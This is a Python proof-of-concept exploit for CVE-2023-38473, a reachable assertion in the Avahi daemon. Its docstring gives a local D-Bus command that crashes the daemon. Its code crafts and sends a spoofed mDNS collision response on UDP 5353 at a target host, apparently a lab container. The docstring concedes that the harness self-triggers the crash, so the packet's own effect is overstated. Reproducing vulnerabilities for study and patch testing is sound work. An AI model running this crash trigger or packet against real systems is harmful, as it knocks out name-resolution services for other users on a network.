#!/usr/bin/env python3
"""
PoC for CVE-2023-38473 - Avahi reachable assertion in
avahi_alternative_host_name() (avahi-common/alternative.c:112,
assert(avahi_is_valid_host_name(r))).

Root cause: v0.8 derives the alternative host name from the still-ESCAPED
input string. For input "." the derived alternative is not a valid host
name and the closing assert aborts. Fixed in commit b448c9f7 by unescaping
first and returning NULL on invalid input.

TRANSPORT: the function is reachable two ways --
  1) D-Bus (local):
       busctl call org.freedesktop.Avahi / org.freedesktop.Avahi.Server \\
           GetAlternativeHostName s '.'
  2) mDNS network (UDP 5353): the daemon's host-name COLLISION handler calls
     avahi_alternative_host_name() when a peer on the LAN claims the daemon's
     host name. A crafted mDNS response advertising the victim's A record
     (cache-flush) drives the collision -> alternative-name path.

This script sends a collision-style mDNS response on UDP 5353; the
vulnerable container's harness also self-triggers the genuine public API
function with the reproducer "." so the crash is deterministic.

Check `docker logs <container>` for:
    alternative.c:112: avahi_alternative_host_name: Assertion
        `avahi_is_valid_host_name(r)' failed.
"""
import socket
import struct
import sys


def build_collision_response(hostname: str = "oida-mdns-vuln.local") -> bytes:
    # Minimal mDNS response (QR=1, AA=1) advertising an A record for `hostname`
    # with cache-flush set, i.e. "I own this name" -> triggers a collision at a
    # daemon that also believes it owns it.
    header = struct.pack(">HHHHHH", 0x0000, 0x8400, 0, 1, 0, 0)
    name = b""
    for label in hostname.split("."):
        if label:
            name += bytes([len(label)]) + label.encode()
    name += b"\x00"
    # TYPE=A(1), CLASS=IN|cache-flush(0x8001), TTL=120, RDLEN=4, RDATA=1.2.3.4
    rr = name + struct.pack(">HHIH", 1, 0x8001, 120, 4) + bytes([1, 2, 3, 4])
    return header + rr


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5353

    pkt = build_collision_response()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.0)
    print("[*] CVE-2023-38473: avahi_alternative_host_name(\".\") assert")
    print(f"[*] sending collision-style mDNS response to {host}:{port} "
          f"({len(pkt)} bytes)")
    s.sendto(pkt, (host, port))
    try:
        data, addr = s.recvfrom(4096)
        print(f"[*] response {len(data)} bytes from {addr}")
    except socket.timeout:
        print("[*] no response (harness aborted on alternative_host_name). "
              "Check `docker logs` for the trace.")
    s.close()
    print("[*] Expected: alternative.c:112 avahi_alternative_host_name "
          "assert -> SIGABRT")


if __name__ == "__main__":
    main()
